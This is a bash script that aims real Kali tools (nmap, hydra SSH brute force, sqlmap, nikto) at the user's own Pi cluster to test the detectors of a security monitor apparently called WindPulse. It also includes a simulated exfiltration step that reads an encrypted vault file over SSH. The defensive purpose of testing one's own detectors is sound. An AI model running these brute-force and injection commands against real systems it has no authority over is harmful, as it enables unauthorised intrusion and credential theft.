#!/usr/bin/env bash
# Drive REAL Kali tools against YOUR OWN cluster, each mapped to a WindPulse detector and
# an evaluation scenario. Run on Kali.
#
#   FOR YOUR OWN CLUSTER ONLY. Unlike attacks.py, these tools have no built-in scope guard,
#   so the script asks you to confirm the target is yours (set CONFIRM=1 to skip the prompt).
#
# Usage:
#   ./kali-attacks.sh recon    <pi-ip>                 # nmap port scan        -> port-scan incident
#   ./kali-attacks.sh brute    <pi-ip> [user]          # hydra, wrong pws      -> brute-force (Sc.2)
#   PASSWORD='real-pw' \
#   ./kali-attacks.sh breakin  <pi-ip> [user]          # hydra finds the pw    -> BREAK-IN (Sc.1/3)
#   ./kali-attacks.sh exfil    <pi-ip> [user]          # pull the vault file   -> only ciphertext
#   WEB_URL=http://<pi>/dvwa/ ./kali-attacks.sh web <pi-ip>   # sqlmap/nikto    -> web-attack
#   ./kali-attacks.sh all      <pi-ip> [user]          # recon -> brute -> breakin
set -euo pipefail

CMD="${1:-}"; TARGET="${2:-}"; USER_NAME="${3:-pidemo}"
[ -n "$CMD" ] && [ -n "$TARGET" ] || { grep '^#' "$0" | sed 's/^# \{0,1\}//'; exit 2; }

WL="$(mktemp)"; trap 'rm -f "$WL"' EXIT
# a small, obvious demo wordlist
printf '%s\n' 123456 password admin root raspberry toor letmein qwerty changeme pi > "$WL"

confirm() {
  [ "${CONFIRM:-0}" = "1" ] && return 0
  printf 'About to attack %s with real tools. Type the IP again to confirm it is YOUR cluster: ' "$TARGET"
  read -r ans; [ "$ans" = "$TARGET" ] || { echo "mismatch — aborting."; exit 1; }
}
need() { command -v "$1" >/dev/null || { echo "missing '$1' (install: sudo apt install -y $2)"; return 1; }; }

recon() {   # 01 Reconnaissance -> port-scan detector
  need nmap nmap || return 1
  echo "### nmap recon on $TARGET  (-> WindPulse port-scan incident)"
  nmap -Pn -T4 --top-ports 200 -sV "$TARGET"
}

brute() {   # 08 Credential Access, wrong passwords -> brute-force incident (Scenario 2)
  need hydra hydra || return 1
  echo "### hydra SSH brute-force on $TARGET as $USER_NAME (all wrong) (-> brute-force incident / block)"
  hydra -l "$USER_NAME" -P "$WL" -t 4 -f -I ssh://"$TARGET" || echo "  (no valid password found — defended)"
}

breakin() { # includes the real password -> a successful login inside the window = BREAK-IN
  need hydra hydra || return 1
  : "${PASSWORD:?set PASSWORD to the real password for the break-in}"
  echo "$PASSWORD" >> "$WL"
  echo "### hydra on $TARGET as $USER_NAME, real password in the list (-> BREAK-IN, Sc.1/3)"
  hydra -l "$USER_NAME" -P "$WL" -t 4 -f -I ssh://"$TARGET"
}

exfil() {   # 13 Exfiltration -> encryption at rest means only ciphertext comes out
  : "${PASSWORD:?set PASSWORD to log in and attempt exfiltration}"
  need sshpass sshpass || return 1
  echo "### attacker pulls the sensitive file from $TARGET ..."
  SSHPASS="$PASSWORD" sshpass -e ssh -o StrictHostKeyChecking=no "$USER_NAME@$TARGET" \
    'cat ~/vault/research_data.enc 2>/dev/null | head -c 120; echo' \
    && echo "  ^ only ciphertext — the key is on the hub, so the data stays protected (Sc.1/3)"
}

web() {     # web app attacks (needs a target web app, e.g. DVWA)
  : "${WEB_URL:?set WEB_URL to the test web app, e.g. http://$TARGET/dvwa/}"
  need sqlmap sqlmap && { echo "### sqlmap on $WEB_URL (-> web-attack incident)"; sqlmap -u "${WEB_URL}?id=1" --batch --level 1 || true; }
  need nikto nikto && { echo "### nikto on $WEB_URL"; nikto -h "$WEB_URL" || true; }
}

confirm
case "$CMD" in
  recon)   recon ;;
  brute)   brute ;;
  breakin) breakin ;;
  exfil)   exfil ;;
  web)     web ;;
  all)     recon; echo; brute; echo; breakin ;;
  *) echo "unknown command: $CMD"; exit 2 ;;
esac
